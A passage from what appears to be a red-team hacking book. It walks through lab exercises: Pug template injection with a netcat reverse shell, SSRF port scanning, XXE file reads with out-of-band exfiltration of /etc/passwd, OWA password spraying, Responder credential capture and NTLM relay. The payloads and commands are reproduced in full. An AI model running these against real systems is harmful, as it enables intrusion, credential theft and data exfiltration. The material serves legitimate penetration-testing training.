handler module will rename  the file to a\nrandom string of characters with no extension.  Within the upload response\ncontents of the page, there exists the server path location of the uploaded\nfile.  Using this information, we can use /drouting to perform template\ninjection to achieve remote code execution.\n \nSince we know the underlying application is Node (JavaScript), what kind\nof payload could we upload to be executed by Pug?  Going back to the\nsimple example that we used earlier:\nFirst, assign a variable to the require module\n-var x = global.process.mainModule.require\nUse of the child  process module enables us to access Operating\nSystem functionalities by running any system command:\n-x('child_process').exec('nc  [Your_IP] 8888 -e\n/bin/bash')\n \nRCE Upload Attack:\nGo to http://chat:3000 and login with any valid account\nUpload a text file with the information below .  In Pug the \"-\"\ncharacter means to execute JavaScript.\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc [Your_IP] 8888 -e\n/bin/bash')\nReview the request and respon se in Burp from uploading the\nfile.  You will notice a hash of the file that was uploaded in the\nresponse POST request and a reference to drouting.\n \n\n \nIn this template code, we are assigning the require function to\nchild_process .exec, which allows us to run commands on the\noperating system  level.  This code will cause the web server to\nconnect to our listener running on [Your_IP] on port 8888 and\nallow us to have shell on the web server .\nOn the attacker machine, start a netcat listener for the shell to\nconnect back\nnc -l -p 8888\nWe activate the code by running the endpoint on /drouting.  In a\nbrowser , go to your uploaded hashfile.  The drouting endpoin t\ntakes a specified  Pug template and renders it.  Fortunately for us,\nthe Pug template that we uploaded contains our reverse Shell.\nIn a browser , access the drouting endpoint with your\nfile as that was recovered from the response of the file\nupload.  We use the directory traversal \"../\" to go one\ndirectory lower  to be able to get into the uploads\nfolder that contains our malicious file:\n/drouting?filename=../uploads/[YOUR FILE\nHASH]\nGo back to your terminal listening on 8888 and interact with\nyour shells!\n \n \nServer Side Request Forgery (SSRF)\nServer Side Request Forgery (SSRF) is one of those vulnerab ilities that I\nfeel is generally misunderstood and, terminology-wise, often confused in\nname with Cross-Site Request Forgery (CSRF).  Although this vulnerability\nhas been around for a while,  it really hasn't been discuss ed enough,\nespecially with such severe consequences.    Let's take a look into the what\nand why .\n \nServer Side Request Forgery is generally abused to gain access onto the\nlocal system, into the internal network, or to allow for some sort of\npivoting.  The easiest way to understand SSRF is walking through an\nexample.  Let's say you have a public web application that allows users to\nupload a profile image by URL from the Internet.  You log into the site, go\nto your profile, and click the button that says update profile from Imgur (a\npublic image hosting service).  You supply the URL of your image (for\nexample: https://i.imgur .com/FdtLoFI.jpg) and hit submit.  What happens\nnext is that the server creates a brand new request, goes to the Imgur site,\ngrabs the image  (it might do some image manipulation to resiz e the image\n—imagetragick anyone?), saves it to the server , and sends  a success\nmessage back to the user.  As you can see, we supplied a URL, the server\ntook that URL and grabbed the image, and uploaded it to its database.\n \nWe originally supplied the URL to the web application to grab our profile\npicture from an external resource. However , what would happen if we\npointed that image URL to http://127.0.0.1:80/favicon.ico instead?  This\nwould tell the server instead of going to something like Imgur , to grab the\nfavicon.ico from  the local host webserver (which is itself).  If we are able to\nget a 200 message or make our profile picture the localhost favicon, we\nknow we potentially have an SSRF .\n \nSince it worked on port 80, what would happen if we tried to connect to\nhttp://127.0.0.1:8080, which is a port not accessible except from localhost? \nThis is where it gets interesting.  If we do get full HTTP request/responses\nback and we can make GET requests to port 8080 locally , what happens if\nwe find a vulner able Jenkins or Apache Tomcat service?  Even though this\nport isn't publicly listening, we might be able to compromise that box. \nEven better, instead of 127.0.0.1, what if we started to request internal IPs: \nhttp://192.168.10.2-254?  Think back to those web scanner findings that\ncame back with internal IP disclosures, which you brushed off as lows—\nthis is where they come back into play and we can use them to abuse\ninternal network services. \n \nAn SSRF vulnerability enables you to do the following:\n1. Access services on loopback interface\n2. Scan the internal network and potentially interact with those\nservices (GET/POST/HEAD)\n3. Read local files on the server using FILE://\n4. Abuse A WS Rest interface (http://bit.ly/2ELv5zZ)\n5. Move laterally into the internal environment\n \nIn our following diagram, we are finding a vulnerable SSRF on a web\napplication that allows us to abuse the vulnerability: \n \nLet's walk thr ough a r eal life example:\nOn your Chat Support System (http://chat:3000/) web\napplication, first make sure to create an account and log in. \nOnce logged in, go to Direct Message (DM) via the link or\ndirectly through http://chat:3000/directmessage.\nIn the \"Link\" textbox, put in a website like\nhttp://cyberspacekittens.com and click the preview link.\nYou should now see the http://cyberspacekittens.com page\nrender , but the URI bar should still point to our Chat\nApplication.\nThis shows that the site is vulnerable to SSRF .  We could also\ntry something like chat:3000/ssrf?\nuser=&comment=&link=http://127.0.0.1:3000 and point to\nlocalhost.  Notice that the page renders and that we are now\naccessing the site via localhost on the vulnerable server .\n \n \nWe know  that the application itself is listening on port 3000.  We can nmap\nthe box from the outside and find that no other web ports are currently\nlistening, but what services are only available to localhost?  To find this out,\nwe need  to bruteforce through all the ports for 127.0.0.1.  We can do this by\nusing Burp Suite and Intruder . \n \nIn Burp Suite, go to the Proxy/HTTP History T ab and find the\nrequest of our last SSRF .\nRight-click in the Request Body and Send to Intruder .\nThe Intruder tab will light up, go to the Positions T ab and click\nClear .\nClick and highlight over the port \"3000\" and click Add.  Y our\nGET request should look like this:\nGET /ssrf?\nuser=&comment=&link=http://127.0.0.1:§3000§\nHTTP/1.1\nClick the Payloads tab and select Payload T ype \"Numbers\".  W e\nwill go from ports 28000 to 28100.  Normally , you would go\nthrough all of the ports, but let's trim it down for the lab.\nFrom: 28000\nTo: 28100\nStep: 1\nClick \"Start Attack\"\n \n \nYou will see that the response length of port 28017 is much larger than all\nthe other requests.  If we open up a browser and go to: http://chat:3000/ssrf?\nuser=&comment=&link=http://127.0.0.1:28017, we should be able to abuse\nour SSRF and gain access to the MongoDB W eb Interface.\n \n \nYou should be able to access all the links, but you have to remember that\nyou need to use the SSRF.  To access the serverStatus\n(http://chat:3000/serverStatus?text=1), you will have to use the SSRF attack\nand go here:\nhttp://chat:3000/ssrf?\nuser=&comment=&link=http://127.0.0.1:28017/serverStatus?\ntext=1.\n \n\n \n \nServer Side Request Forgery can be extremely dangerous.  Although not a\nnew vulnerabili ty, there is an increasing amount of SSRF vulnerabilities\nthat are found these days.  This usually leads to certain critical findings due\nto the fact that SSRFs allow pivoting within the infrastructure. \n \nAdditional Resources:\nLots on encoding localhost:\nhttp://www .agarri.fr/docs/AppSecEU15-\nServer_side_browsing_considered_harmful.pdf\nBug Bounty - AirBNB\nExample: http://bit.ly/2ELvJxp\n \nXML eXternal Entities (XXE)\nXML stands for eXtensible Markup Language and was designed to\nsend/store data that is easy to read.  XML eXternal Entities (XXE) is an\nattack on XML parsers in applications.  XML parsing is commonly found in\napplications that allow file uploads, parsing Office documents, JSON data,\nand even Flash type games.  When XML parsing is allowe d, improper\nvalidation can grant an attacker to read files, cause denial of service attacks,\nand even remote code execution .  From a high level, the application has the\nfollowing needs  1) to parse XML data supplied by the user, 2) the system\nidentifier portion  of the entity must be within the document type declaration\n(DTD), and 3) the XML processor must validate/process DTD and resolve\nexternal entities.\n \nNormal XML File Malicious XML\n<?xml version=\"1.0\"\nencoding=\"ISO-8859-1\"?>\n<Prod>\n<Type>Book</type>\n<name>THP</name>\n<id>100</id>\n</Prod>\n <?xml version=\"1.0\"\nencoding=\"utf-8\"?>\n<!DOCTYPE test [\n    <!ENTITY xxe SYSTEM\n\"file:///etc/passwd\">\n]>\n<xxx>&xxe;</xxx>\n \nAbove, we have  both a normal XML file and one that is specially crafted to\nread from the system's /etc/passwd file.  We are going to see if we can inject\na malicious XML request within a real XML request. \n \nXXE Lab:\nDue to a custom  configuration request, there is a different VMW are Virtual\nMachine for the XXE attack.  This can be found here:\nhttp://thehackerplaybook.com/get.php?type=XXE-vm\n \nOnce downloade d, open the virtual machine in VMW are and boot it up.  At\nthe login screen, you don't need  to login, but you should see the IP address\nof the system.\n \nGo to browser:\nProxy all traf fic through Burp Suite\nGo to the URL: http://[IP of your V irtual Machine]\nIntercept traf fic and hit \"Hack the XML\"\n \nIf you view the HTML source code of the page after loading it, there is a\nhidden field that is submitted via a POST request.  The XML content looks\nlike:\n<?xml version=\"1.0\" ?>\n<!DOCTYPE thp [\n<!ELEMENT thp ANY>\n<!ENTITY book \"Universe\">\n]>\n<thp>Hack The &book;</thp>\n \nIn this example , we specified that it is XML version 1.0, DOCTYPE,\nspecified the root element is thp, !ELEMENT specifies ANY type, and\n!ENTITY sets the book to the string \"Universe\".  Lastly , within our XML\noutput, we want to print out our entity from parsing the XML file. \n \nThis is normall y what you might see in an application that sends XML\ndata.  Since we control the POST data that has the XML request , we can try\nto inject our own malicious entities.  By default, most XML parsing\nlibraries support  the SYSTEM keyword that allows data to be read from a\nURI (including locally from the system using the file:// protoc ol).  So we\ncan create our own entity to craft a file read on /etc/passwd.\n \nOriginal XML File Malicious XML\n<?xml version=\"1.0\" ?>\n<!DOCTYPE thp [\n<!ELEMENT thp ANY>\n<!ENTITY book \"Universe\">\n]>\n<thp>Hack The &book;</thp><?xml version=\"1.0\" ?>\n<!DOCTYPE thp [\n<!ELEMENT thp ANY>\n<!ENTITY book SYSTEM\n\"file:///etc/passwd\">\n]>\n<thp>Hack The &book;</thp>\n \nXXE Lab - Read File:\nIntercept traf fic and hit \"Hack the XML\" for [IP of Y our\nVM]/xxe.php\nSend the intercepted traf fic to Repeater\nModify the \"data\" POST parameter to the following:\n<?xml version=\"1.0\" ?><!DOCTYPE thp [\n<!ELEMENT thp ANY><!ENTITY book SYSTEM\n\"file:///etc/passwd\">]><thp>Hack The\n%26book%3B</thp>\nNote that %26 = & and %3B = ;.  W e will need to percent\nencode the ampersand and semicolon character .\nSubmit the traf fic and we should be able to read /etc/passwd\n \n \nAdvanced XXE - Out Of Band (XXE-OOB)\nIn the previous attack, we were  able to get the response back in the <thp>\ntags.  What if we couldn’ t see the response or ran into character/file\nrestrictions?  How could we get our data to send Out Of Band (OOB)? \nInstead of defining our attack in the request payload, we can supply a\nremote Document Type Definiti on (DTD) file to perform an OOB-XXE.  A\nDTD is a well-structured XML file that defines the structure and the legal\nelements and attributes of an XML document.  For sake of ease, our DTD\nwill contain all of our attack/exfil payloads, which will help us get around a\nlot of the character limitations.  In our lab example, we are going to cause\nthe vulnerable XXE server to request a DTD hosted on a remote server .\n \nOur new XXE attack will be performed in four stages:\nModified XXE XML Attack\nFor the V ulnerable XML Parser to grab a DTD file from an\nAttacker's Server\nDTD file contains code to read the /etc/passwd file\nDTD file contains code to exfil the contents of the data out\n(potentially encoded)\n \nSetting up our Attacker Box and XXE-OOB Payload:\nInstead of the original File Read, we are going to specify an\nexternal DTD file\n<!ENTITY % dtd SYSTEM\n\"http://[Y our_IP]/payload.dtd\"> %dtd;\nThe new \"data\" POST payload will look like the following\n(remember to change [Y our_IP]):\n<?xml version=\"1.0\"?><!DOCTYPE thp\n[<!ELEMENT thp ANY ><!ENTITY % dtd\nSYSTEM \"http://[YOUR_IP]/payload.dtd\"> %dtd;]>\n<thp><error>%26send%3B</error></thp>\nWe are going to need to host this payload on our attacker server\nby creating a file called payload.dtd\ngedit /var/www/html/payload.dtd\n<!ENTITY % file SYSTEM\n\"file:///etc/passwd\">\n<!ENTITY % all \"<!ENTITY send\nSYSTEM\n'http://[Y our_IP]:8888/collect=%file;'>\">\n%all;\nThe DTD file you just created instructs the vulnerable server to\nread /etc/passwd and then try to make a web request with our\nsensitive data back to our attacker machine. T o make sure we\nreceive our response, we need to spin up a web server to host the\nDTD file and set up a NetCat listener\nnc -l -p 8888\nYou are going to run across an error that looks something like\nthe following: simplexml_load_string(): parser error : Detected\nan entity reference loop in <b>/var/www/html/xxe.php</b> on\nline <b>20.  When doing XXE attacks, it is common to run into\nparser errors.  Many times XXE parsers only allow certain\ncharacters, so reading files with special characters will break the\nparser .  What we can do to resolve this?  In the case with PHP ,\nwe can use PHP input/output streams\n(http://php.net/manual/en/wrappers.php.ph p) to read local files and base64\nencode them using php://filter/read=convert.base64-encode. \nLet's restart our NetCat listener and change our payload.dtd file\nto use this feature:\n<!ENTITY % file SYSTEM\n\"php://filter/read=convert.base64-\nencode/resource=file:///etc/passwd\">\n<!ENTITY % all \"<!ENTITY send SYSTEM\n'http://[Y our_IP]:8888/collect=%file;'>\">\n%all;\n \n \n \nOnce we repeat our newly modi fied request, we can now see that our victim\nserver first grabs the payload.dtd file, processes it, and makes a secondary\nweb request to your NetCat handler listening on port 8888.  Of course, the\nGET request will be base64 encoded and we will have to decode the\nrequest.\n \nMore XXE payloads:\nhttps://gist.github.com/staaldraad/01415b990939494879b4\nhttps://github.com/danielmiessler/SecLists/blob/master/Fuzzing/\nXXE-Fuzzing.txt\n \nC o n c l u s i o n\nAlthough this is only a small glimpse of all the different web attacks you\nmay encounter , the hope was to open your eyes to how these newer\nframeworks are introducing old and new attacks.  Many of the common\nvulnerability and application scanners tend to miss a lot of these more\ncomplex vulnera bilities due to the fact that they are language or framework\nspecific.  The main point I wanted to make was that in order to perform an\nadequate review , you need to really understand the language and\nframeworks.\n4 the drive - compromising the network\n \n \n \n \nOn day two of your assessment, you ran nmap on the whole network,\nkicked off vulne rability scanners  with no luck, and were not able to identify\nan initia l entry point on any of their web applications.  Slight ly defeated,\nyou take a step back and review all your reconnaissance notes.  You know\nthat once you can get into the network, there are a myriad of tricks you can\nuse to obtain more credentials, pivot between boxes, abuse features in\nActive Directory , and find the space loot we all crave.  Of course , you know\nthat it won't be an easy task.  There will be numerous trip wires to bypass,\nguards to misguide, and tracks to cover . \n \nIn the last THP book, The Drive section focused on using findings from the\nvulnerability scanners and exploiting them.  This was accomplished using\ntools like Metasploit, printer exploits, Heartbleed, Shellshock, SQL\ninjections, and other types of common exploits.  More recently , there have\nbeen many great code execution vulnerabilities like Eternal Blue (MS017-\n10), multiple Jenkins exploits, Apache Struts 2, CMS applic ations, and\nmuch more.  Since this is the Red Team version of THP, we won't focus\nextensively on how to use these tools or exploits for specific\nvulnerabilities.  Instead, we will focus on how to abuse the corporate\nenvironments and live of f of the land. \n \nIn this chapter , you will be conc entrating on Red Team tactics, abusing the\ncorporate infras tructure, gettin g credentials, learning about the internal\nnetwork, and pivoting between hosts and networks.  We will be doing this\nwithout ever running a single vulnerability scanner .\n \nFinding Credentials from Outside the Network\nAs a Red Teamer , finding the initial entry point can be compl ex and will\nrequire plenty of resources.  In the past books, we have cloned our victim's\nauthentication pages, purchased doppelganger domains, target spear\nphished, created custom malware, and more.\n \nSometimes, I tell my Red Teams to just . . . keep it simple .  Many times we\ncome up with these crazy advan ced plans, but what ends up working is the\nmost basic plan.  This is one of the easiest…\n \nOne of the most basic techniques that has been around is password\nbruteforcing.  But, as Red Teamers, we must look at how to do this smartly . \nAs companies grow , they require more technologies and tools.  For an\nattacker , this definitely opens up the playing field.  When companies start to\nopen to the internet, we start to see authentication required for email (i.e.\nOffice 365 or OWA), communication (i.e. Lync, XMPP , WebEx) tools,\ncollaboration tools (i.e. JIRA, Slack, Hipchat, Huddle), and other external\nservices (i.e. Jenkins, CMS sites, Support sites).  These are the targets we\nwant to go after . \n \nThe reason we try to attack these servers/services is because we are looking\nfor applications  that authenticate against the victim’ s LDAP/Active\nDirectory (AD) infrastructure.  This could be through some AD federation,\nSingle SignOn process, or directly to AD.  We need to find some common\ncredentials to utilize in order to move on to the secondary attack.  From the\nreconnaissance phase, we found and identified a load of email and\nusername accounts, which we will use to attack through what is called\nPassword Spray ing.  We are going to target all the different applications and\ntry to guess basic passwords as we’ve seen this in real world APT style\ncampaigns (US-CER T Article: http://bit.ly/2qyB9rb)\n \nWhy should we test authentication against dif ferent external services?\nSome authentication sources do not log attempts from external\nservices\nAlthough we generally see email or VPN requiring two-factor\nauthentication, externally-facing chat systems may not\nPassword reuse is very high\nSometimes external services do not lock out AD accounts on\nmultiple bad attempts\n \nThere are many  tools that do bruteforcing, however , we are going to focus\non just a couple of them.  The first one is a tool from Spiderlabs\n(http://bit.ly/2EJve6N) called Spray .  Although Spray is a little more\ncomplicated to use, I really like the concept of the services it sprays.  For\nexample, they support SMB, OW A, and L ync (Microsoft Chat).\n \nTo use spray , you specify the following:\nspray .sh -owa <tar getIP> <usernameList> <passwordList>\n<AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>\n<Domain>\n \nAs you will see in the example  below , we ran it against a fake OWA mail\nserver on cyberspacekittens (which doesn't exist anymore) and when it got\nto peter with password Spring2018, it found a successful attem pt (you can\ntell by the data length). \n \nA question I often get involves  which passwords to try, as you only get a\nnumber of password attempts before you lock out an account.  There is no\nright answer for this and is heav ily dependent on the company .  We used to\nbe able to use very simple passwords like \"Password123\", but those have\nbecome more rare to find.  The passwords that do commonly give us at least\none credential are:\nSeason + Y ear\nLocal Sports T eam + Digits\nLook at older breaches, find users for the tar get company and\nuse similar passwords\nCompany name + Y ear/Numbers/Special Characters (!, $, #, @)\n \nIf we can get away with it, we run these scans 24/7 slowly , as not to trigger\nany account lockouts.  Remember , it only takes one password to get our\nfoot in the door!\n \nThis is a quick script that utilizes Curl to authenticate to OW A.\n \nConfiguring Spray is pretty simple and can be easily converte d for other\napplications.  What you need to do is capture the POST request for a\npassword attempt (you can do this in Burp Suite), copy all the request data,\nand save it to a file.  For any fields that will be bruteforced, you will need to\nsupply the string \"sprayuser\" and \"spraypassword\".\n \nFor example, in our case the post-request.txt file would look like the\nfollowing:\nPOST /owa/auth.owa HTTP/1.1\nHost: mail.cyberspacekittens.com\nUser-Agent: Mozilla/5.0 (X1 1; Linux x86_64; rv:52.0)\nGecko/20100101 Firefox/52.0\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://mail.cyberspacekittens.com/owa/auth/logon.aspx?\nreplaceCurrent=1&url=https%3a%2f%2fmail.cyberspacekittens.com%\n2fowa%2f\nCookie: ClientId=VCSJKT0FKWJDYJZIXQ; PrivateComputer=true;\nPBack=0\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-T ype: application/x-www-form-urlencoded\nContent-Length: 131\n \ndestination=https%3A%2F%2Fcyberspacekittens.com%2Fowa%2F&fl\nags=4&forcedownlevel=0&username= sprayuser @cyberspacekittens.c\nom&password= spraypassword &passwordT ext=&isUtf8=1\n \nAs mentioned before, one addit ional benefit of spray .sh is that it supports\nSMB and Lync as well. Another tool that takes advantage of and abuses the\nresults from Spraying is called Ruler (https://github.com/sensepost/ruler). \nRuler is a tool written by Sensepost that allows you to interact with\nExchange servers through either the MAPI/HTTP or RPC/HTTP protocol. \nAlthough we are mainly going to be talking about using Ruler for\nbruteforcing/info-gathering, this tool also supports some persistence\nexploitation attacks, which we will lightly touch on.  \n \nThe first feature we can abuse is similar to the Spray tool, which\nbruteforces through users and passwords.  Ruler will take in a list of\nusernames and passwords, and attempt to find credentials.  It will\nautomatically try to autodiscover the necessary Exchange configurations\nand attempt to find credentials.  T o run Ruler:\nruler --domain cyberspacekittens.com brute --users ./users.txt --\npasswords ./passwords.txt\n \n \nOnce we find a single passwor d, we can then use Ruler to dump all the\nusers in the O365 Global Address List (GAL) to find more email addresses\nand the email groups to which they belong. \n \n \nTaking these email addresses, we should be able to send all these accounts\nthrough the bruteforce tool and find even more credentials—this is the\ncircle of passwords.  The main purpose of the Ruler tool though, is that\nonce you have credentials, you can abuse \"features\" in Office/Outlook to\ncreate rules and forms on a victim's email account.  Here is a great write-up\nfrom SensePost on how they were able to abuse these features to execute\nMacros that contain our Empire payload:\nhttps://sensepost.com/blog/2017/outlook-forms-and-shells/. \n \nIf you don't decide to use the Outlook forms or if the features have been\ndisabled, we can always go back to the good ol' attacks on email.  This is\nwhere it does make you feel a little dirty, as you will have to log in as one\nof the users and read all their email.  After we have a couple good chuckles\nfrom reading their emails, we will want to find an existing conversation\nwith someone who they seem to trust somewhat (but not good friends). \nSince they alrea dy have a rapport built, we want to take advantage of that\nand send them malware.  Typically , we would modify one of their\nconversations with an attachme nt (like an Office file/executable), resend it\nto them, but this time with our malicious agent.  Using these trusted\nconnections and emails from internal addresses provides great cover and\nsuccess. \n \nOne point I am going to keep mentioning throughout the book is that the\noverall campaig n is built to test the Blue Teams on their detection\ntools/processes.  We want to do certain tasks and see if they will be able to\nalert or be able to forensically identify what happened.  For this portion of\nthe lab, I love validating if the company can determine that someone is\nexfiltrating their users’ emails.  So, what we do is dump all of the\ncompromised emails using a Python script:\nhttps://github.com/Narcolapser/python-o365#email.  In many cases, this can\nbe gigabytes of data! \nAdvanced Lab\nA great exercise  would be to take the different authentication type services\nand test them all for passwords.  Try and build a password spray tool that\ntests authentication against XMPP services, common third-party SaaS tools,\nand other common protocols.  Even better would be to do this from multiple\nVPS boxes, all controlled from a single master server .\n \nMoving Through the Network\nAs a Red Teamer , we want to move through the network as quietly as\npossible.  We want to use \"features\" that allow us to find and abuse\ninformation about the network, users, services, and more.  Generally , on a\nRed Team camp aign, we do not want to run any vulnerability scans within\nan environment.  There are even times where we might not even want to run\na nmap scan against an internal network.  This is because many companies\nhave gotten pretty good at detec ting these types of sweeps, especially when\nrunning something as loud as a vulnerability scanner . \n \nIn this section, you will be focusing on moving through Cyber Space\nKittens' network  without setting off any detections.  We will assume you\nhave already somehow gotten onto the network and started to either look\nfor your first set of credentials or have a shell on a user's machine.\n \nSetting Up the Envir onment - Lab Network\nThis part is completely optional, but because of Microsoft licensing, there\naren't any pre-canned VM labs to follow with the book.  So it is up to you\nnow to build a lab! \n \nThe only way to really learn how to attack environments it to fully build it\nout yourself.  This gives you a much clearer picture of what you are\nattacking, why the attacks work or fail, and understand limitations of certain\ntools or processes.  So what kind of lab do you need to build?  You will\nprobably need one for both Windows and Linux (and maybe even Mac)\nbased on your client's environment.  If you are attacking corporate\nnetworks, you will probably have to build out a full Activ e Directory\nnetwork.  In the following lab, we will go over how to build a lab for all the\nexamples in this book.\n \nAn ideal Windows testing lab for you to create at home might look\nsomething like the following:\nDomain Controller - Server: [ W indows 2016 Domain\nController]\nWeb server: [IIS on W indows 2016]\nClient Machines: [W indows 10] x 3 and [W indows 7] x 2\nAll running on VMW are W orkstation with at least 16 GB of\nRAM and 500GB SSD hard drive\n \nConfiguring and Creating a Domain Controller:\nMicrosoft Directions on building a 2016 server:\nhttps://blogs.technet.microsoft.com/canitpro/2017/02/\n22/step-by-step-setting-up-active-directory-in-\nwindows-server -2016/\nBit.ly Link: http://bit.ly/2JN8E19\nOnce Active Directory is installed and configured, create users\nand groups with: dsac.exe\nCreate multiple users\nCreate groups and assign to Users:\nSpace\nHelpdesk\nLab\n \nSet up Client Machines (W indows 7/10) to Join the Domain:\nUpdate all machines\nJoin the machines to the Domain\nhttps://helpdeskgeek.com/how-to/windows-join-\ndomain/\nMake sure to add one domain user with the ability to run as local\nadministrator on each box.  This can be accomplished by adding\nthat domain user to the local administrators group on the local\nmachine.\nEnable local administrator on each host and set password\n \nSet up GPO to:\nDisable Firewall (https://www .youtube.com/watch?\nv=vxXLJSbx1SI)\nDisable A V (http://bit.ly/2EL0uTd)\nDisable Updates\nAdd Helpdesk to the local administrators group\nOnly Allow Login for Domain Admins, Local Administrators,\nhelpdesk (http://bit.ly/2qyJs5D)\nLastly , link your GPO to your root domain \n \nSet all users for each OS to autologin (it just makes life much easier for\ntesting).  Every time a machine starts or reboots, it will autologin so that we\ncan easily test attacks that pull credentials from memory:\nhttps://support.microsoft.com/en-us/help/324737/how-to-turn-\non-automatic-logon-in-windows\nBit.ly Link: http://bit.ly/2EKatIk\n \nSet up IIS Server and configure SPN:\nhttps://www .rootusers.com/how-to-install-iis-in-windows-\nserver -2016/\nBit.ly Link: http://bit.ly/2JJQvRK\nhttps://support.microsoft.com/en-us/help/929650/how-to-use-\nspns-when-you-configure-web-applications-that-are-hosted-on\nBit.ly Link: http://bit.ly/2IXZygL\n \nOn the Network with No Credentials\nLet’s say you were unable to get any passwords from Spraying their\nexternal service s and therefore decide that you want to sneak into the\nbuilding.  You wait until after lunchtime, walk over to their Cyber Space\nKittens' offices, and find the smokers door.  Even though you don't smoke,\nyou know that the smokers have that gang mentality .  You light up a\ncigarette, chat with the workers about nothing, and as they walk into their\nbuilding, you follow them in . . . no questions asked! \n \nNow that you have broken into the CSK facility , you don't want to get\ncaught by stayin g there too long.  You pull out your trusty drop box, find an\nempty office, plug it into the network, check your phone to see that it\nbeaconed home, and swiftly walk back to safety .  \n \nSlightly sweating at home, you quickly jump onto your laptop, log into your\nVPN server, and give a sigh of relief as your drop box beacons are still\nconnecting home.  Now that you can SSH into your drop box, which\ncontains all your hacker tools, you can slowly discover the clien t's network,\npivot between boxes, and try to get to the data you care about. \n \nResponder\nJust like in the previous campaign, we used Responder\n(https://github.com/lgandx/Responder) to listen on the network and spoof\nresponses to gain credentials on the network.  As a recap from The Hacker\nPlaybook 2, when a system on the network makes a DNS hostn ame lookup\nthat fails, that victim system uses Link-Local Multicast Name  Resolution\n(LLMNR for short) and the Net-BIOS Name Service (NBT -NS) for fallback\nname resolution.  When that victim PC fails the DNS lookup , the victim\nstarts asking anyone on the network if they know the resolution for that\nhostname. \n \nAn easy and general example: let's say your PC has a fixed mounted drive\nfor \\\\cyberspace kittenssecretdrive\\secrets.  One day, the IT department\nremoves that share drive from the network and it no longer exists.  Due to\nthe fact you still have a mounted drive for the server name,\ncyberspacekittenssecretdrive, your system will continually ask the network\nif anyone knows the IP for it.  Now , this file share example could be rare to\nfind; however , because there is a high likelihood that a previously\nconnected syste m no longer exists on the network, this issue will still\noccur .  We have seen this from mounted drives, applications that have\nhardcoded servers, and many times, just misconfigurations.\n \nWe can use a tool like Responder to take advantage of those systems\nlooking for a hostname and respond to it with our malicious server.  Even\nbetter is that Responder can go a step above and act as a WPAD (Web\nProxy Auto-Discovery Protocol) server , proxying all data through our\nattacker server , but that is a whole other attack.\n \ncd /opt/Responder\n./Responder .py -I eth0 -wrf\n \nNow , since we are in a Window s Enterprise Environment, we can make the\nassumption that it most likely is running Active Directory .  So, if we can\nrespond to the DNS lookup from our victim host, we can make their system\nconnect to our SMB share.  Since they are connecting to the drive\n\\\\cyberspacekittenssecretdrive, we are going to force the victim to\nauthenticate with their NTLMv2 credentials (or cached credenti als).  These\ncredentials that we capture will not be straight NTLM hashes, but they will\nbe NTLM Challenge/Response hashes (NTLMv2-SSP).  The only issue\nwith these hashes is that they are immensely slower to crack than the\nnormal NTLM hashes, but this isn't a huge problem these days with large\ncracking boxes at our disposal (see cracking section).\n \n \n \nWe can take the NTLMv2 hash, pass it over to hashcat, and crack the\npasswords.  Within hashcat, we need to specify the hash format \"-m\"\n(https://hashcat.net/wiki/doku.php?id=example_hashes ) for NetNTLMv2. \nhashcat -m 5600 hashes\\ntlmssp_hashes.txt passwordlists/*\n \nNow , let's say we don't really want to crack hashes or we don't mind\npossibly alerting the user to something suspicious.  What we can do is force\na basic auth pop-up instead of requiring the use of NetNTLMv2 credentials\nby using the F (ForceWpadAuth) and b (basic auth).\npython ./Responder .py -I eth0 -wfFbv\n \n \nAs you can see from the imag e above, the user will be prompted for a\nusername and password, which most people will just blindly enter .  Once\nthey submit their credentials, we will be able to capture them in clear text!\n \n \nBetter Responder (MultiRelay .py)\nThe problem with Responder and cracking NTLMv2-SSP hashe s is that the\ntime it takes to crack these hashes can be extensive.  Worse, we have been\nin environments where the passwords for administrators are 20+ characters. \nSo, what can we do in these scenarios?  If the environment does not enforce\nSMB signing (which we can find with a quick nmap script scan -\nhttps://nmap.or g/nsedoc/scripts/smb-security-mode.html), we can do a slick\nlittle trick with replaying the SMB request we captured.\n \nLaurent Gaffie included a tool in Responder to handle authentication replay\nattacks.  Per Laurent's site, \"MultiRelay is a powerful pentest utility\nincluded in Responder's tools folder , giving you the ability to perform\ntargeted NTLM v1 and NTLMv2 relay on a selected target.  Currently\nMultiRelay relays HTTP , WebDav , Proxy and SMB authentic ations to an\nSMB server.  This tool can be customized to accept a range of users to relay\nto a target. The concept behind this is to only target domain Administrators,\nlocal Administrators, or privileged accounts.” [http://g-\nlaurent.blogspot.com/2016/10/introducing-responder -multirelay-10.html]\n \nFrom a high level, instead of forcing the victim to authenticate to our SMB\nshare, MultiRelay will forward any authentication requests will be\nforwarded to a victim host of our choice.  Of course, that relayed user will\nneed to have access into that other machine; however , if successful, we\ndon't need to deal with any passwords or cracking.  To get started, we need\nto configure our Responder and MultiRelay:\nEdit the Responder config file to disable SMB and HTTP\nservers\ngedit Responder .conf\nChange SMB and HTTP to Of f\nStart Responder\npython ./Responder .py -I eth0 -rv\nStart MultiRelay in a New T erminal W indow\n/opt/Responder/tools\n./MultiRelay .py -t <tar get host> -c <shell command> -\nu ALL\n \nOnce the Relay to a victim host is achievable, we need to think  about what\nwe want to execute on our victim workstation.  By default, MultiRelay can\nspawn a basic shell, but we can also automatically execute Meterpreter\nPowerShell payloads, Empire PowerShell payloads, our dnscat2 PowerShell\npayload, PowerShell Scripts to Download and Execute C2 agents,\nMimikatz, or just run calc.exe for kicks. \n \n \nReferences\nhttp://threat.tevora.com/quick-tip-skip-cracking-responder -\nhashes-and-replay-them/\n \nPowerShell Responder\nOnce we compromise a Windows system, we can use PowerShell off our\nvictim to do Responder style attacks.  Both features of the original\nResponder can be performed through the following two tools: \nInveigh - https://github.com/Kevin-\nRobertson/Inveigh/blob/master/Scripts/Inveigh.ps1\nInveigh-Relay\n \nTo make things even easier , all this is already built into Empire.\n \nUser Enumeration Without Credentials\nOnce on the network, we might be able to use Responder to get credentials\nor shells, but there are also times when both SMB signing is enabled and\ncracking NTLM v2 SSP isn't viable.  That is when we take a step back and\nstart with the basics.  Without actively scanning the network yet, we need to\nget a list of users (could be for password spraying or even social\nengineering). \n \nOne option is to start enumerating users against the Domain Controller . \nHistorically (back in the 2003 era), we could try to perform RID cycling to\nget a list of all user accounts.  Although this is no longer availab le, there are\nother options to bruteforce accounts.  One option is to abuse Kerberos:\nnmap -p88 --script krb5-enum-users --script-ar gs 